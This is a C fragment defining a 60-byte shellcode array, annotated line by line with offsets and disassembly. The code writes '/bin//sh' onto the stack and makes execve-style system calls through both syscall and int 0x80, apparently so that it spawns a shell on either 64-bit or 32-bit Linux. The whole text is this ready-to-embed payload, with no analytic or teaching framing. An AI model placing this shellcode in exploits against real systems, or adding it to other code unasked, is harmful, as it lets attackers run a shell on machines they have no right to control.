
#define SH_SIZE 60

char SH[] = {
  /* 0000 */ "\x31\xc0"                     /* xor eax, eax                    */
  /* 0002 */ "\x99"                         /* cdq                             */
  /* 0003 */ "\x52"                         /* push edx                        */
  /* 0004 */ "\x52"                         /* push edx                        */
  /* 0005 */ "\x52"                         /* push edx                        */
  /* 0006 */ "\x54"                         /* push esp                        */
  /* 0007 */ "\x5b"                         /* pop ebx                         */
  /* 0008 */ "\x53"                         /* push ebx                        */
  /* 0009 */ "\x5f"                         /* pop edi                         */
  /* 000A */ "\xc7\x07\x2f\x62\x69\x6e"     /* mov dword [edi], 0x6e69622f     */
  /* 0010 */ "\xc7\x47\x04\x2f\x2f\x73\x68" /* mov dword [edi+0x4], 0x68732f2f */
  /* 0017 */ "\x52"                         /* push edx                        */
  /* 0018 */ "\x57"                         /* push edi                        */
  /* 0019 */ "\x54"                         /* push esp                        */
  /* 001A */ "\x5e"                         /* pop esi                         */
  /* 001B */ "\x56"                         /* push esi                        */
  /* 001C */ "\x59"                         /* pop ecx                         */
  /* 001D */ "\x40"                         /* inc eax                         */
  /* 001E */ "\x75\x04"                     /* jnz 0x24                        */
  /* 0020 */ "\xb0\x3b"                     /* mov al, 0x3b                    */
  /* 0022 */ "\x0f\x05"                     /* syscall                         */
  /* 0024 */ "\x52"                         /* push edx                        */
  /* 0025 */ "\x51"                         /* push ecx                        */
  /* 0026 */ "\x53"                         /* push ebx                        */
  /* 0027 */ "\x54"                         /* push esp                        */
  /* 0028 */ "\x6a\x0b"                     /* push 0xb                        */
  /* 002A */ "\xb0\x06"                     /* mov al, 0x6                     */
  /* 002C */ "\x6a\xff"                     /* push 0xffffffff                 */
  /* 002E */ "\x54"                         /* push esp                        */
  /* 002F */ "\xcd\x80"                     /* int 0x80                        */
  /* 0031 */ "\x85\xc0"                     /* test eax, eax                   */
  /* 0033 */ "\x58"                         /* pop eax                         */
  /* 0034 */ "\x58"                         /* pop eax                         */
  /* 0035 */ "\x58"                         /* pop eax                         */
  /* 0036 */ "\x7c\x02"                     /* jl 0x3a                         */
  /* 0038 */ "\xb0\x3b"                     /* mov al, 0x3b                    */
  /* 003A */ "\xcd\x80"                     /* int 0x80                        */
};